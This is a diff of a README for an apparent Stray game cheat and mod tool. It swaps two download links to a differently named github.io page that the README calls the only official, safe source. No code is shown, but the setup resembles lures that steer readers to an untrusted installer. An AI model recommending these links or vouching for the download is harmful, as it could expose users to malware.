@@ -2,7 +2,7 @@
 
 Stray Desktop Mod Utility is the ultimate tool for enhancing your gameplay in Stray. This Windows desktop application provides a seamless way to customize your experience with features like god mode, infinite health, and save editing. Last updated in 2026, it ensures compatibility with the latest game versions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ A5: You can uninstall it via Windows Settings > Apps > Stray Desktop Mod Utility
 
 ## Download
 
-[Get the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the only official download source for Stray Desktop Mod Utility. Always use the provided link to ensure you receive authentic and safe files. The tool is free to use and distribute, but please respect copyright and game policies.
 
